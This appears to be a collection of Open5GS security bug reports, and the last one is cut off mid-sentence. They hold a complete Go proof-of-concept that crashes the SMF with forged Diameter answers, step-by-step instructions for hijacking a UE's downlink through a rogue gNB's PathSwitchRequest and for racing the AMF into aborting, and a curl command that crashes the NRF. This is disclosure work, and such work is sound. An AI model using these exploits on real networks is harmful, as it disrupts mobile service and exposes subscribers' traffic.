items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Description
`smf_gx_cca_cb()`, `smf_gy_cca_cb()`, and `smf_s6b` CCA callbacks use
`ogs_assert(new == 0)` after `fd_msg_sess_get()` to verify the session
already exists. If a malicious Diameter peer replies with a CCA containing
an unknown or mismatched `Session-Id`, `fd_msg_sess_get()` returns `new=1`
(new session), triggering `ogs_assert()` → `ogs_abort()` → **SMF process crash**.

A single malformed CCA message is sufficient to crash the SMF, denying
service to all UE sessions.

### Steps to reproduce


1. Start the DoS PoC

```bash
go mod tidy
go run . \
  -listen 10.44.44.9:3868 \
  -cer-host pcrf.localdomain \
  -cer-realm localdomain \
  -mode bogus-session
```
PoC
```go
package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	"github.com/fiorix/go-diameter/v4/diam"
	"github.com/fiorix/go-diameter/v4/diam/avp"
	"github.com/fiorix/go-diameter/v4/diam/datatype"
	"github.com/fiorix/go-diameter/v4/diam/dict"
	"github.com/fiorix/go-diameter/v4/diam/sm"
)

// Gx Application ID (3GPP TS 29.212)
const gxApplicationID uint32 = 16777238

// Gy Application ID (DCCA, RFC 4006)
const gyApplicationID uint32 = 4

// 3GPP Vendor ID
const vendor3GPP uint32 = 10415

var (
	flagListen   = flag.String("listen", "127.0.0.9:3868", "Listen address (replace legitimate PCRF/OCS)")
	flagCERHost  = flag.String("cer-host", "pcrf.localdomain", "Origin-Host for CER/CEA handshake (must match ConnectPeer)")
	flagCERRealm = flag.String("cer-realm", "localdomain", "Origin-Realm for CER/CEA handshake")
	flagMode     = flag.String("mode", "bogus-session", "DoS mode: bogus-session | cross-app")
)

func main() {
	flag.Parse()
	log.SetFlags(log.Ltime | log.Lmicroseconds)

	log.Println("========================================")
	log.Println("  PoC: SMF CCA Session Assertion DoS")
	log.Println("  Vulnerability: ogs_assert(new == 0)")
	log.Println("  Affected files:")
	log.Println("    - src/smf/gx-path.c:779")
	log.Println("    - src/smf/gy-path.c:1009")
	log.Println("    - src/smf/s6b-path.c:390, 733")
	log.Println("========================================")
	log.Printf("[*] Listen address  : %s", *flagListen)
	log.Printf("[*] CER/CEA Identity: %s / %s", *flagCERHost, *flagCERRealm)
	log.Printf("[*] DoS mode        : %s", *flagMode)

	settings := &sm.Settings{
		OriginHost:       datatype.DiameterIdentity(*flagCERHost),
		OriginRealm:      datatype.DiameterIdentity(*flagCERRealm),
		VendorID:         datatype.Unsigned32(vendor3GPP),
		ProductName:      datatype.UTF8String("dos-poc"),
		OriginStateID:    datatype.Unsigned32(uint32(time.Now().Unix())),
		FirmwareRevision: datatype.Unsigned32(1),
	}

	mux := sm.New(settings)
	mux.HandleFunc("CCR", handleCCR)
	mux.HandleFunc("ALL", func(c diam.Conn, m *diam.Message) {
		if m.Header.CommandCode != diam.CreditControl {
			log.Printf("[~] Received %s (cmd=%d) from %s — ignoring",
				cmdName(m), m.Header.CommandCode, c.RemoteAddr())
		}
	})

	log.Printf("[*] Waiting for SMF to connect on %s ...", *flagListen)
	if err := diam.ListenAndServe(*flagListen, mux, dict.Default); err != nil {
		log.Fatalf("[-] ListenAndServe failed: %v", err)
	}
}

func handleCCR(c diam.Conn, m *diam.Message) {
	appID := m.Header.ApplicationID
	sessionID := extractUTF8(m, avp.SessionID, 0)
	ccRequestType := extractUint32(m, avp.CCRequestType, 0)
	ccRequestNumber := extractUint32(m, avp.CCRequestNumber, 0)

	log.Println()
	log.Println("[+] ============================================")
	log.Printf("[+] CCR received from SMF (%s)", c.RemoteAddr())
	log.Printf("[+] ApplicationId   : %d (%s)", appID, appName(appID))
	log.Printf("[+] Session-Id      : %s", sessionID)
	log.Printf("[+] CC-Request-Type : %d (%s)", ccRequestType, ccRequestTypeName(ccRequestType))

	mode := *flagMode
	switch mode {
	case "bogus-session":
		// Send CCA with a fabricated Session-Id that doesn't match any
		// existing session in the SMF. This causes fd_msg_sess_get() to
		// return new=1, triggering ogs_assert(new == 0) → abort().
		sendBogusSessionCCA(c, m, appID, ccRequestType, ccRequestNumber)

	case "cross-app":
		// Send CCA with Gx ApplicationId in response to a Gy CCR (or vice versa).
		// The session lookup in the wrong application's callback fails
		// with new=1, triggering the same assertion.
		sendCrossAppCCA(c, m, appID, sessionID, ccRequestType, ccRequestNumber)

	default:
		log.Fatalf("[-] Unknown mode: %s", mode)
	}
}

// sendBogusSessionCCA replies with a CCA containing a fabricated Session-Id.
// The SMF's fd_msg_sess_get() will not find this session, returning new=1.
// gx-path.c:779 / gy-path.c:1009: ogs_assert(new == 0) → abort()
func sendBogusSessionCCA(c diam.Conn, m *diam.Message, appID, ccRequestType, ccRequestNumber uint32) {
	bogusSessionID := fmt.Sprintf("bogus.attacker.com;%d;999;app_dos", time.Now().Unix())

	cca := m.Answer(2001)

	// Insert fabricated Session-Id as first AVP
	cca.InsertAVP(diam.NewAVP(avp.SessionID, avp.Mbit, 0,
		datatype.UTF8String(bogusSessionID)))

	cca.NewAVP(avp.OriginHost, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERHost))
	cca.NewAVP(avp.OriginRealm, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERRealm))
	cca.NewAVP(avp.AuthApplicationID, avp.Mbit, 0,
		datatype.Unsigned32(appID))
	cca.NewAVP(avp.CCRequestType, avp.Mbit, 0,
		datatype.Enumerated(ccRequestType))
	cca.NewAVP(avp.CCRequestNumber, avp.Mbit, 0,
		datatype.Unsigned32(ccRequestNumber))

	if _, err := cca.WriteTo(c); err != nil {
		log.Printf("[-] Failed to send CCA: %v", err)
		return
	}

	log.Println("[!] ----- DoS CCA SENT (bogus-session) -----")
	log.Printf("[!] Bogus Session-Id: %s", bogusSessionID)
	log.Println("[!] SMF will call fd_msg_sess_get() → new=1")
	log.Println("[!] ogs_assert(new == 0) → ogs_abort() → SMF CRASH")
	log.Println("[+] ============================================")
}

// sendCrossAppCCA replies to all CCRs with the same CCA (including Gx AVPs).
// When a Gy CCR gets a Gx-style CCA, the Gy callback's session lookup
// fails because the Session-Id belongs to a different application context.
func sendCrossAppCCA(c diam.Conn, m *diam.Message, appID uint32, sessionID string, ccRequestType, ccRequestNumber uint32) {
	// Always respond with Gx ApplicationId, regardless of what was requested
	cca := m.Answer(2001)

	cca.InsertAVP(diam.NewAVP(avp.SessionID, avp.Mbit, 0,
		datatype.UTF8String(sessionID)))

	cca.NewAVP(avp.OriginHost, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERHost))
	cca.NewAVP(avp.OriginRealm, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERRealm))
	// Force Gx ApplicationId regardless of original request
	cca.NewAVP(avp.AuthApplicationID, avp.Mbit, 0,
		datatype.Unsigned32(gxApplicationID))
	cca.NewAVP(avp.CCRequestType, avp.Mbit, 0,
		datatype.Enumerated(ccRequestType))
	cca.NewAVP(avp.CCRequestNumber, avp.Mbit, 0,
		datatype.Unsigned32(ccRequestNumber))

	if _, err := cca.WriteTo(c); err != nil {
		log.Printf("[-] Failed to send CCA: %v", err)
		return
	}

	log.Println("[!] ----- DoS CCA SENT (cross-app) -----")
	log.Printf("[!] Original CCR AppId: %d (%s)", appID, appName(appID))
	log.Printf("[!] CCA AppId forced : %d (Gx)", gxApplicationID)
	log.Println("[!] Session mismatch in callback → ogs_assert(new==0) → SMF CRASH")
	log.Println("[+] ============================================")
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func extractUTF8(m *diam.Message, code uint32, vendorID uint32) string {
	a, err := m.FindAVP(code, vendorID)
	if err != nil || a == nil {
		return "(not found)"
	}
	return string(a.Data.Serialize())
}

func extractUint32(m *diam.Message, code uint32, vendorID uint32) uint32 {
	a, err := m.FindAVP(code, vendorID)
	if err != nil || a == nil {
		return 0
	}
	switch v := a.Data.(type) {
	case datatype.Unsigned32:
		return uint32(v)
	case datatype.Enumerated:
		return uint32(v)
	case datatype.Integer32:
		return uint32(v)
	default:
		return 0
	}
}

func appName(id uint32) string {
	switch id {
	case gxApplicationID:
		return "Gx"
	case gyApplicationID:
		return "Gy"
	default:
		return "unknown"
	}
}

func ccRequestTypeName(t uint32) string {
	switch t {
	case 1:
		return "INITIAL_REQUEST"
	case 2:
		return "UPDATE_REQUEST"
	case 3:
		return "TERMINATION_REQUEST"
	case 4:
		return "EVENT_REQUEST"
	default:
		return "UNKNOWN"
	}
}

func cmdName(m *diam.Message) string {
	if m.Header.CommandFlags&diam.RequestFlag != 0 {
		return "Request"
	}
	return "Answer"
}
```
The PoC impersonates `pcrf.localdomain` for the CER/CEA handshake,
then replies to every CCR with a CCA containing a fabricated Session-Id
(`bogus.attacker.com;...;app_dos`).

2.  trigger UE attach
 Start eNB + UE to trigger attach 


3. SMF crashes immediately

The SMF process terminates upon receiving the malicious CCA.

### Root Cause

```c
// gx-path.c:777-779 (same pattern in gy-path.c:1007-1009 and s6b-path.c)
ret = fd_msg_sess_get(fd_g_config->cnf_dict, *msg, &session, &new);
ogs_assert(ret == 0);
ogs_assert(new == 0);  // <-- crash if session not found
```

`ogs_assert()` is defined as:
```c
// lib/core/ogs-log.h:112-119
#define ogs_assert(expr) \
    do { \
        if (ogs_likely(expr)) ; \
        else { \
            ogs_fatal("%s: Assertion `%s' failed.", OGS_FUNC, #expr); \
            ogs_abort(); \
        } \
    } while(0)
```

When `new != 0` (session not found), `ogs_abort()` calls `abort()`,
killing the SMF process immediately. This should be a graceful error
(log + discard message), not a hard crash.

### Logs

```shell
03/04 04:01:31.837: [diam] ERROR:      'Credit-Control-Answer'
        Version: 0x01
        Length: 164
        Flags: 0x40 (-P--)
        Command Code: 272
        ApplicationId: 4
         AVP: 'Session-Id'(263) l=49 f=-M val="bogus.attacker.com;1772596891;999;app_dos"
         AVP: 'Result-Code'(268) l=12 f=-M val='DIAMETER_SUCCESS' (2001 (0x7d1))
         AVP: 'Origin-Host'(264) l=24 f=-M val="pcrf.localdomain"
         AVP: 'Origin-Realm'(296) l=19 f=-M val="localdomain"
         AVP: 'Auth-Application-Id'(258) l=12 f=-M val=4 (0x4)
         AVP: 'CC-Request-Type'(416) l=12 f=-M val='INITIAL_REQUEST' (1 (0x1))
         AVP: 'CC-Request-Number'(415) l=12 f=-M val=0 (0x0)

03/04 04:01:31.837: [core] FATAL: backtrace() returned 7 addresses (../lib/core/ogs-abort.c:37)
    open5gs-smfd(+0x573a1)
    /usr/local/lib/libfdcore.so.7(+0x6d2e7)
    /usr/local/lib/libfdcore.so.7(+0x7251c)
    /usr/local/lib/libfdcore.so.7(+0x727a5)
    /lib/x86_64-linux-gnu/libc.so.6(+0x94ac3)
    /lib/x86_64-linux-gnu/libc.so.6(clone+0x44)
```

### Expected behaviour

When the SMF receives a CCA whose `Session-Id` does not match any active
Diameter session (i.e. `fd_msg_sess_get()` returns `new=1`), the SMF should:

1. Log a warning/error identifying the unknown session.
2. Discard the malformed message and free associated resources.
3. Continue running normally, unaffected — all other UE sessions remain active.

A rogue or misconfigured Diameter peer must **not** be able to crash the SMF
through a single unexpected reply.

### Observed Behaviour

When a CCA with a fabricated or mismatched `Session-Id` is received:

1. `fd_msg_sess_get()` returns `new=1` (session not found in local table).
2. `ogs_assert(new == 0)` immediately fails.
3. `ogs_fatal()` logs `"Assertion 'new == 0' failed."` and calls `ogs_abort()`.
4. The **entire SMF process is killed** via `abort()`.
5. All active UE PDN/PDU sessions are instantly torn down; the network is
   unavailable until SMF restarts — and the crash repeats on every new attach
   if the malicious peer remains connected.

### eNodeB/gNodeB

srsenb

### UE Models and versions

srsue

items.title: [Security Bug]: AMF accepts NGAP PathSwitchRequest without ownership check + Crashes due to race condition

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). 
Still unfixed on current main (source-checked 2026-09-04 @ `941e4cc2d`).

### Security impact

Any associated peer can re-home a live UE's NGAP context and redirect
its downlink FAR to an attacker-chosen endpoint due to a lack of ownership in the
referenced UE context. The redirection of the victim's downlink stream to 
an attacker-controlled endpoint is the confidentiality/integrity impact, and the controlled 
outage is the availability impact.

**Update: The same primitive can also be used to trigger AMF process abort with no SMF 
precondition due to race condition**

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **AMF** — NGAP PathSwitchRequest handling
(`src/amf/ngap-handler.c`, `ngap_handle_path_switch_request()`) and the
UE-context/`ran_ue` management it drives.

### Summary

`ngap_handle_path_switch_request()` resolves the target UE with a global
lookup by the AMF_UE_NGAP_ID carried in the message
(`ran_ue_find_by_amf_ue_ngap_id()`, `src/amf/ngap-handler.c:3074`) and
never verifies that the sending NGAP association is the one that
currently owns (serves) that UE context. Any associated gNB, including
a rogue gNB smuggled out of a UE data plane, can re-home a
live peer UE's NGAP context to itself by knowing or enumerating the
peer's AMF_UE_NGAP_ID. After acceptance, the AMF runs its normal 
path-switch chain: the context move is logged
([OLD]/[NEW] RAN_UE_NGAP_ID), the handler's PDU-session loop sends an
N11 SM-context update, and the SMF/UPF rewrite the victim's downlink
FAR toward the attacker's endpoint (UPF `gtp_connect() [10.45.0.9]:2152`). 
The victim's downlink was measurably cut and recovered only
when the victim re-registered (a full re-registration on a new address).

This bug can also be used to trigger a race condition assert.
1. The PathSwitchRequest handler switches the victim's context to the
   sender's gNB with no ownership check
   (`ran_ue->gnb_id = gnb->id`).
2. When that association goes down, `amf_gnb_remove()` frees the
   `amf_gnb_t` while the per-UE deactivation chain (N11/PFCP for the
   victim's live PDU sessions) is still in flight. The `ran_ue` is not
   reaped (the sweep skips it because the deactivation created new SBI
   transactions) but keeps pointing at the freed gNB.
3. A PathSwitchRequest re-claim for the victim's AMF_UE_NGAP_ID
   arriving inside that window (delta ≈ 0–1 ms observed) resolves the
   still-alive context, then `ran_ue_switch_to_gnb()` resolves the
   dangling `gnb_id` → `amf_gnb_find_by_id()` returns NULL →
   `ogs_assert(gnb)` aborts `open5gs-amfd`
   (`src/amf/context.c:1451`). amfd is left `<defunct>`; every NGAP
   service is lost until the open5gs containers restart.

These issues are still present on current main (`1f70b24c`).
The RAN-node-ownership enforcement commit `9a22baa76`
("Enforce RAN node ownership in handover handlers") adds
`source_ue->gnb_id != gnb->id` checks to the NGAP/S1AP handover handlers
but its own commit message explicitly excludes PathSwitchRequest.

### Steps to reproduce
#### Issue A: PathSwitchRequest from any peer.
Lab: Two attached UEs.
* Attacker UE `10.45.0.9`
* Benign peer UE `10.45.0.8`
* Core container `192.168.233.132` hosting both AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).

1. Attach both UEs.
2. From the attacker UE, open an SCTP association to
   `192.168.233.132:38412` with inner IP packets sent as ordinary uplink
   IP packets through the attacker's established PDU session (the UPF
   decapsulates and the kernel delivers them to the AMF, as in the PFCP
   smuggling path). AMF log: `gNB-N2 accepted[10.45.0.9]:33250 in
   ng-path module`.
3. Complete NG Setup with a gNB ID distinct from the real gNB (fake gNB
   ID 2) and the lab PLMN/TAC (001/01, TAC 1) — NGSetupResponse,
   successfulOutcome (proc 21), 54 bytes.
4. Probe PathSwitchRequest candidates (attacker-chosen RAN_UE_NGAP_ID
   5000, UserLocationInformation with the lab TAC): ErrorIndication-sweep
   the 60 unknown AMF_UE_NGAP_IDs (3–7, 10–64, PDU Session ID 1), then
   send three probes each (PDU Session IDs 1, 2, 3) to the two live IDs
   — the peer's (8) and the attacker's own (9). Record per-candidate
   responses.
5. The peer's live ID 8 with session 1 is accepted: verify the
   `[OLD]`/`[NEW]` context move in the AMF log, the UPF Session
   Modification with `gtp_connect() [10.45.0.9]:2152` two milliseconds
   later, and re-measure the peer's downlink. The attacker's own ID 9 is
   likewise accepted (context re-homed, UPF session modified) but its
   probes draw no decodable response.

#### Issue B: Crash AMF
Lab: Two attached UEs.
* Attacker UE (PDU-session address `10.45.0.2`
* Benign peer UE `imsi-001010123456790` with a live PDU session.
* Core container `192.168.233.132` hosting AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).
Script: `r8b_race.py` (attached zip; staged in the attacker UE container with
the `ueprobe` package and `pycrate`); the associations are smuggled as
ordinary uplink IP packets through the attacker's PDU session.

1. Attach both UEs (the peer's live session is what keeps its `ran_ue`
   alive through the removal).
2. From the attacker UE open association B (NG Setup, gNB ID 3), then
   association A (NG Setup, gNB ID 2). Both get NGSetupResponse
   (successfulOutcome, proc 21).
3. Re-home the peer's context onto A: PathSwitchRequest from A
   (attacker-chosen `RAN_UE_NGAP_ID` 5000, the peer's live
   `AMF_UE_NGAP_ID`, UserLocationInformation with the lab TAC) →
   PathSwitchRequestAcknowledge (proc 25).
4. SHUTDOWN A and, delta = 0, send the re-claim PathSwitchRequest for
   the peer's ID from B (single burst pre-associated, no handshake
   inside the window). The script sweeps delta 0–40 ms in 0.4 ms steps
   for robustness.
5. Detect: no response to the re-claim and a fresh NG Setup that gets
   no answer, meaning that amfd is gone. The script's liveness check is a full NG
   Setup exchange (a raw-SCTP connect alone cannot see a dead peer).

### Logs (Attached)
#### Issue A: PathSwitchRequest from any peer.
[R8-amf-pathswitch-context-hijack.zip](https://github.com/user-attachments/files/31734861/R8-amf-pathswitch-context-hijack.zip)

```shell
[amf] INFO: gNB-N2 accepted[10.45.0.9]:33250 in ng-path module
[amf] INFO: PathSwitchRequest
[amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[3]    (x60: ids 3..7 and 10..64, cause radioNetwork=14)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[8] AMF_UE_NGAP_ID[8]     (14:33:27.685 — peer's live ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[8]
[upf] DEBUG: Session Modification Request                     (14:33:27.687)
[gtp] INFO: gtp_connect() [10.45.0.9]:2152                    (14:33:27.687)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[9] AMF_UE_NGAP_ID[9]     (14:33:27.851 — attacker's own ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[9]
[upf] DEBUG: Session Modification Request                     (14:33:27.852)
```

(all lines from `q023_amf.log` and `q023_upf.log`. `q023_smf.log`'s
capture starts at 14:33:28.167, so the N11 SM-context update has no
SMF-side line; the only `POST /nsmf-pdusession/v1/sm-contexts/7/modify`
in it is at 14:34:05.777 — the association-release-phase modify for the
victim's session, after which the downlink stayed cut.)

(Each accepted path switch also logs `UE Security Capability mismatch in PathSwitchRequest`.
Per TS 33.501 6.7.3.1 comment in the handler, the AMF answers a mismatched
PathSwitchRequest with its locally stored UE security capabilities in
the PathSwitchRequestAcknowledge (`ngap-handler.c:3310-3314`).)

58 diverted GTP-U datagrams were captured on
the attacker's UDP 2152 listener (`q023_sink.jsonl`), all on the
attacker's own-session TEID 0xa5000091, none on the peer-session TEID
0xa5000081 (attacker-chosen and installed by the AMF in the victim's
downlink FAR).

#### Issue B: Crash AMF

[R8b-amf-pathswitch-context-hijack-crash.zip](https://github.com/user-attachments/files/31863769/R8b-amf-pathswitch-context-hijack-crash.zip)

Run 4 of 4 (11:09:06), verbatim from `amf.log`
(`amf-crash-r8b3-w4.log` in the zip; runs 1–3 in `amf-crash-r8b3-w1/2/3.log`):

    09/05 11:09:05.944: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:05.944: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[4] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [OLD] TAC[1] CellID[0x10] (ngap-handler.c:3104)
    09/05 11:09:05.944: [amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [NEW] TAC[1] CellID[0x10] (ngap-handler.c:3306)
    09/05 11:09:06.495: [amf] INFO: gNB-N2[10.45.0.2] connection refused!!! (amf-sm.c:882)
    09/05 11:09:06.495: [amf] INFO: [Removed] Number of gNBs is now 2 (context.c:1305)
    09/05 11:09:06.495: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:06.495: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:06.496: [amf] INFO:     [OLD] TAC[1] CellID[0x10]
    09/05 11:09:06.496: [amf] FATAL: ran_ue_switch_to_gnb: Assertion `gnb' failed. (../open5gs-src/src/amf/context.c:1451)
    09/05 11:09:06.496: [core] FATAL: backtrace() returned 11 addresses (../open5gs-src/lib/core/ogs-abort.c:37)

Four consecutive runs, identical fingerprint, delta = 0 each time:

| run | re-home | `[Removed]` | re-claim → FATAL (`context.c:1451`) |
|-----|-----------------|--------------------|--------------------------------------|
| 1   | 10:55:58.825    | 10:55:59.376       | 10:55:59.377                         |
| 2   | 11:01:26.841    | 11:01:27.391       | 11:01:27.392                         |
| 3   | 11:06:44.628    | 11:06:45.179       | 11:06:45.180                         |
| 4   | 11:09:05.944    | 11:09:06.495       | 11:09:06.496                         |

After each abort `open5gs-amfd` is `<defunct>` (zombie; no child reaper
restarts it) meaning that we get no NGAP service until the open5gs containers restart.

### Expected behaviour

The AMF must verify that the NGAP association sending a
PathSwitchRequest is the association that currently owns (serves) the
referenced UE context, and reject otherwise (cause: unexpected NGAP peer
/ unknown local UE NGAP-ID) without leaking which AMF_UE_NGAP_IDs are
live. Additionally, the AMF must never resolve a UE context to a freed gNB. The association
close and the UE-context cleanup must be ordered so no `ran_ue` can
outlive the gNB it points at. A re-claim for a context the sender does not own
should additionally fail the ownership check before any switch.
**Upstream itself applied exactly this class of ownership check to
the neighbouring handlers in `9a22baa76`.**

### Observed Behaviour
#### Issue A: PathSwitchRequest from any peer.
```c
/* src/amf/ngap-handler.c @ ee596937d — ngap_handle_path_switch_request() */
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);        /* :3074 — global lookup */
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]",
            (long long)amf_ue_ngap_id);
    r = ngap_send_error_indication(
            gnb, (uint64_t *)RAN_UE_NGAP_ID, &amf_ue_ngap_id,
            NGAP_Cause_PR_radioNetwork,
            NGAP_CauseRadioNetwork_unknown_local_UE_NGAP_ID);
    return;
}
amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
…
/* Change ran_ue to the NEW gNB after mandatory IE validation */   /* :3288 */
ran_ue_switch_to_gnb(ran_ue, gnb);                                  /* :3289 */
ogs_info("    [NEW] RAN_UE_NGAP_ID[%lld] AMF_UE_NGAP_ID[%lld] ",    /* :3291 */
    (long long)ran_ue->ran_ue_ngap_id, (long long)ran_ue->amf_ue_ngap_id);
```

The lookup is global across all gNB associations: `gnb` (the sending
association) is never compared with the context's serving gNB. The
ErrorIndication branch at `:3074-3085` is the enumeration oracle — it
distinguishes "no such UE" from "accepted" on the same ID space. After
acceptance the handler logs the `[OLD]`/`[NEW]` move and proceeds into
the N11/N4 modification chain.

#### Issue B: Crash AMF
`ogs_assert(gnb)` fails in `ran_ue_switch_to_gnb()` (`context.c:1451`)
and amfd aborts as `<defunct>` zombie and we get no NGAP service until the
containers restart.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Bug]: NRF crashes with SIGABRT when heartBeatTimer is set to a negative value via NF registration

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

## Steps to reproduce

The NRF crashes with SIGABRT when a `PUT /nnrf-nfm/v1/nf-instances/{id}` request contains `heartBeatTimer: -1` (or any non-positive value). The negative value is passed directly to `ogs_timer_start_debug()` at `ogs-timer.c:114`, which asserts `duration > 0` and aborts.

**Environment:**
- Docker deployment, bridge network 172.23.0.0/24
- NRF at 172.23.0.10:7777
- No other NFs required (NRF crashes on its own registration handler)

**Reproduction (single curl command):**

```bash
curl -X PUT \
  "http://172.23.0.10:7777/nnrf-nfm/v1/nf-instances/test-nf-001" \
  -H "Content-Type: application/json" \
  --http2-prior-knowledge \
  -d '{
    "nfInstanceId": "test-nf-001",
    "nfType": "AMF",
    "nfStatus": "REGISTERED",
    "heartBeatTimer": -1
  }'
```

Alternatively, any non-positive heartBeatTimer value triggers the same crash:
- `heartBeatTimer: 0`
- `heartBeatTimer: -100`
- `heartBeatTimer: -2147483648` (INT32_MIN)

**Python reproduction:**
```python
import json, subprocess

body = json.dumps({
    "nfInstanceId": "test-nf-001",
    "nfType": "AMF",
    "nfStatus": "REGISTERED",
    "heartBeatTimer": -1,
})

subprocess.run([
    "curl", "-s", "--http2-prior-knowledge",
    "-X", "PUT",
    "http://172.23.0.10:7777/nnrf-nfm/v1/nf-instances/test-nf-001",
    "-H", "Content-Type: application/json",
    "-d", body,
])
# NRF container exits with code 134 (SIGABRT)
```

**Discovery context:** Found via automated fuzzing with state machine sequences (NRF_Lifecycle chain: Register→Update→Profile→Deregister) and the `negative_array_index` mutation strategy, which substitutes integer fields with negative values. The vulnerability was confirmed reproducible across multiple 24h fuzzing trials.

---

### Logs

```shell
$ docker logs fuzzing-open5gs-nrf --tail 15

[nrf] INFO: [test-nf-001] NF registered [Heartbeat:-1s] (../src/nrf/nf-sm.c:204)
[event] FATAL: ogs_timer_start_debug: Assertion `duration' failed. (../lib/core/ogs-timer.c:114)
[core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
/usr/lib/x86_64-linux-gnu/libogscore.so.2(ogs_timer_start_debug+0x11f) [0x709aebb41c25]
/usr/bin/open5gs-nrfd(+0xdafa) [0x5b2aa3b4cafa]
/usr/bin/open5gs-nrfd(+0xda53) [0x5b2aa3b4ca53]
/usr/bin/open5gs-nrfd(+0xc8de) [0x5b2aa3b4b8de]
...

$ docker inspect fuzzing-open5gs-nrf --format '{{.State.ExitCode}}'
134
```

### Expected behaviour

## Expected behaviour

Per 3GPP TS 29.510 §5.2.2.2, `heartBeatTimer` MUST be an integer between 1 and 3600. Values outside this range (including negative values and zero) should return HTTP 400 Bad Request with a ProblemDetails body. The NRF should NOT abort on invalid timer input.

Specifically:
1. `heartBeatTimer` values ≤ 0 should be rejected with HTTP 400
2. The assertion `duration > 0` should be replaced with a validation check that returns an error code
3. The NRF should never SIGABRT on any valid or invalid input


### Observed Behaviour

## Observed Behaviour 
1. The NRF accepts `heartBeatTimer: -1` without validation
2. The negative value reaches `ogs_timer_start_debug()` at `ogs-timer.c:114`
3. The assertion `duration > 0` fails, triggering FATAL abort
4. The NRF process exits with code 134 (SIGABRT)
5. All registered NF profiles in memory are lost on restart

### eNodeB/gNodeB

N/A

### UE Models and versions

N/A

items.title: [Bug]: SMF Crash: Assertion Failure in smf_n4_build_pdr_to_modify_list() when Processing Incomplete PDUSessionResourceSetupResponse

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

the latest

### Steps to reproduce

## Environment
- **OS:** Linux (specify distribution and version)
- **Test Method:** Protocol fuzzing via NGAP interface

## Reproduction Steps

1. **Setup:** Configure Open5GS with AMF and SMF components

2. **Send malformed NGAP message:** Construct and send a `PDUSessionResourceSetupResponse` message with the following characteristics:
   - **Present IEs:**
     - `qosFlowIdentifier` in `associatedQosFlowList`
   - **Missing critical IEs:**
     - `upTNLInformation` (UL/DL GTP tunnel information)
     - Other tunnel endpoint parameters

3. **Message path:** 
```
   Fuzzer/Test Tool → AMF (N2) → SMF (crash occurs here)
```

4. **Trigger point:** SMF processes the response and attempts to build PFCP Session Modification Request for UPF

## Detailed Message Structure

The problematic message has the following ASN.1 path (payload only contains):
```
successfulOutcome
  └─ value
      └─ PDUSessionResourceSetupResponse
          └─ protocolIEs[2]
              └─ value
                  └─ PDUSessionResourceSetupListSURes[0]
                      └─ pDUSessionResourceSetupResponseTransfer
                          └─ PDUSessionResourceSetupResponseTransfer
                              └─ dLQosFlowPerTNLInformation
                                  └─ associatedQosFlowList[0]
                                      └─ qosFlowIdentifier  ← ONLY THIS FIELD PRESENT
```

**Key issue:** The message contains ONLY `qosFlowIdentifier` without tunnel configuration.

## Root Cause

When SMF processes this incomplete message:
1. It cannot extract tunnel information (`upTNLInformation` is missing)
2. It determines NO PFCP modifications are needed for the UPF
3. All modification counters become zero:
   - `num_of_remove_pdr = 0`
   - `num_of_remove_far = 0`
   - `num_of_create_pdr = 0`
   - `num_of_create_far = 0`
   - `num_of_update_pdr = 0`
   - `num_of_update_far = 0`
   - `num_of_update_qer = 0`
   - `num_of_update_urr = 0`
4. The assertion at `src/smf/n4-build.c:337` fails → **SMF crashes**

## Code Location
```c
// File: src/smf/n4-build.c, Line 337
ogs_assert(num_of_remove_pdr + num_of_remove_far + num_of_create_pdr + 
           num_of_create_far + num_of_update_pdr + num_of_update_far + 
           num_of_update_qer + num_of_update_urr);
```

### Logs

```shell
12/08 15:21:30.086: [smf] FATAL: smf_n4_build_pdr_to_modify_list: Assertion `num_of_remove_pdr + num_of_remove_far + num_of_create_pdr + num_of_create_far + num_of_update_pdr + num_of_update_far + num_of_update_qer + num_of_update_urr' failed. (../src/smf/n4-build.c:337)
12/08 15:21:30.087: [core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

When receiving a `PDUSessionResourceSetupResponse` with incomplete or malformed IEs:

1. **Input validation:** SMF should detect missing critical IEs (e.g., `upTNLInformation`)

2. **Error handling:** Instead of crashing with assertion, SMF should:
